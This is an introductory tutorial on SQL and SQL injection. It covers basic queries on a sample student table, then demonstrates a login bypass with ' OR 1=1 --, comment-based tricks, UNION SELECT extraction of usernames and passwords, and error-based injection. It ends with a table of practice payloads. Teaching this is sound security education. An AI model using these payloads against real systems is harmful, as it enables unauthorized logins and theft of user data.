# 🔍 Introduction to SQL & SQL Injection

## 📘 What is SQL?

**SQL** stands for **Structured Query Language**. It's a programming language used to **store, manage, update, and retrieve data** from **relational databases** like MySQL, PostgreSQL, and MSSQL.

With SQL, users can:
- Insert new data
- Update existing data
- Delete data
- Retrieve specific records

For example:
```sql
SELECT * FROM students;
```

## 📘 What is SQL injection?

SQL Injection is a web vulnerability that happens when a web application allows user input to modify or interfere with backend SQL queries.

In simple words:
If an attacker types something unusual in a login form or search box, and it directly gets used in a database query, they can:

Login without a password

View hidden user data

Delete or modify records

Even take full control of the database!

## 🧠Sample Database: student.db

| id | name    | age | grade | email                                       |
| -- | ------- | --- | ----- | ------------------------------------------- |
| 1  | Alice   | 15  | 10th  | [alice@mail.com](mailto:alice@mail.com)     |
| 2  | Bob     | 16  | 11th  | [bob@mail.com](mailto:bob@mail.com)         |
| 3  | Charlie | 14  | 9th   | [charlie@mail.com](mailto:charlie@mail.com) |
| 4  | Bos     | 15  | 10th  | [bot@mail.com](mailto:bot@mail.com)         |



## 🛠 Basic SQL Commands

SELECT * FROM students;

ㅤ-- Prints the whole table


SELECT name, age FROM students;

ㅤ-- Retrieves only name and age columns


SELECT * FROM students WHERE name = 'Alice';

ㅤ-- Returns only Alice’s record

UPDATE students SET grade = '12th' WHERE name = 'Bob';

ㅤ-- Updates Bob’s grade

DELETE FROM students WHERE name = 'Bot';

ㅤ-- Removes Bos’s record

## 🚨 SQL Injection Example
Injection into the username parameter with a single quote: admin'--

SELECT * FROM members WHERE username = 'admin'--' AND password = 'password' 

--If successful, this will log you as the admin user because the rest of the SQL query after will be ignored.

```🔐1```.Login Bypass Using `' OR 1=1 --`

### 🧪 Input in Login Form:
```text
Username: ' OR 1=1 --
Password: [anything or blank]
```

🧠 What happens in the backend:

SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = '';

1=1 is always true ✅

-- comments out the rest of the query

So the attacker gets logged in without credentials

```📚 2``` Extract Specific Data with ` UNION SELECT`

###🧪 URL Injection Example:

```https://vulnerable.site/products?category=1 UNION SELECT null, username, password FROM users```
🧠 Why It Works:
The attacker joins two SELECT queries

The second query pulls data from the users table

💡 Tip: UNION-based SQLi often needs you to first discover the number of columns (using `ORDER BY` or `UNION SELECT null,...`)

`🔍 3` Error-Based SQL Injection

🧪 Input:

`' AND 1=CONVERT(int, (SELECT TOP 1 name FROM sysobjects))--`

🧠 What it does:
Tries to convert database output into a type it shouldn’t be

Forces the app to throw a database error showing table names or structure.

`💡 4` Using Comments to Bypass Filters

SQL comments are used to ignore the rest of the SQL so the injection doesn’t break the syntax.

Common comment symbols:
```
-- (double dash)
# (hash)
/* ... */ (block comment)
```

Example:
`Username: admin'-- `

This becomes:
`SELECT * FROM users WHERE username = 'admin'--' AND password = 'abc';`

✅ The `--` turns off the rest of the query.


🧠 Summary: Top Payloads to Practice

| Payload                  | Purpose                      |
| ------------------------ | ---------------------------- |
| `' OR 1=1 --`            | Bypass login                 |
| `admin' #`               | Comment out rest of query    |
| `' UNION SELECT ... --`  | Extract other table data     |
| `ORDER BY 3--`           | Test number of columns       |
| `' AND 1=0 UNION SELECT` | Combine true and false logic |


































